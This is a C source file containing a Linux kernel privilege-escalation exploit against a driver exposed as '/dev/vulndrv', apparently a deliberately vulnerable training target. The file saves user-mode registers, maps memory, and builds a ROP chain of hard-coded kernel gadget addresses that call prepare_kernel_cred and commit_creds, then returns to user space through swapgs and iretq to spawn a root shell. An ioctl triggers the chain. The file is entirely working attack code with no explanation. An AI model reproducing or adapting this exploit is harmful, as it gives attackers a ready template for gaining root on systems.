#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include "drv.h"

#define DEVICE_PATH "/dev/vulndrv"

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"pushfq\n"
		"popq %2\n"
		: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"	);
}

void shell(void) {
	if(!getuid())
		system("/bin/sh");

	exit(0);
}

int main(int argc, char *argv[])
{
    int fd;
    struct drv_req req;
    void *mapped, *temp_stack;
    unsigned long base_addr, stack_addr, mmap_addr, *fake_stack;

    req.offset = strtoul(argv[1], NULL, 0x10);
    base_addr = strtoul(argv[2], NULL, 0x10);
    stack_addr = (base_addr + (req.offset * 8)) & 0xffffffff;
    fprintf(stdout, "stack address = 0x%lx\n", stack_addr);

    mmap_addr = stack_addr & 0xfffff000;
    assert((mapped = mmap((void*) mmap_addr, 0x20000, 7, 0x32, 0, 0)) == (void*) mmap_addr);
    assert((temp_stack = mmap((void*) 0x30000000, 0x20000, 7, 0x32, 0, 0)) == (void*) 0x30000000);

    save_state();

    fake_stack = (unsigned long *) stack_addr;
    *fake_stack++ = 0xffffffff8138353fUL;	/* pop rdi; ret */
    
    fake_stack = (unsigned long *) (stack_addr+0x8+0x12);
    *fake_stack++ = 0x0UL;                  /* NULL */
    *fake_stack++ = 0xffffffff8108fce0UL;   /* prepare_kernel_cred() */
    *fake_stack++ = 0xffffffff81057cb2UL;   /* pop rdx; ret */
    *fake_stack++ = 0xffffffff8108fa66UL;   /* commit_creds() + 2 instructions */
    *fake_stack++ = 0xffffffff81035c11UL;   /* mov rdi, rax; call rdx */
    *fake_stack++ = 0xffffffff81050564UL;   /* swapgs; pop rbp; ret */
    *fake_stack++ = 0x0UL;                  /* NULL */
    *fake_stack++ = 0xffffffff81050de6UL;   /* iretq */
    *fake_stack++ = (unsigned long) shell;  /* spawn a shell */
    *fake_stack++ = user_cs;                /* saved cs */
    *fake_stack++ = user_rflags;            /* saved rflags */
    *fake_stack++ = (unsigned long) (temp_stack+0xf00); /* mmaped stack region in user space */
    *fake_stack++ = user_ss;                /* saved ss */

    fd = open(DEVICE_PATH, O_RDONLY);

    if (fd == -1) {
        perror("open");
    }

    ioctl(fd, 0, &req);

    return 0;
}
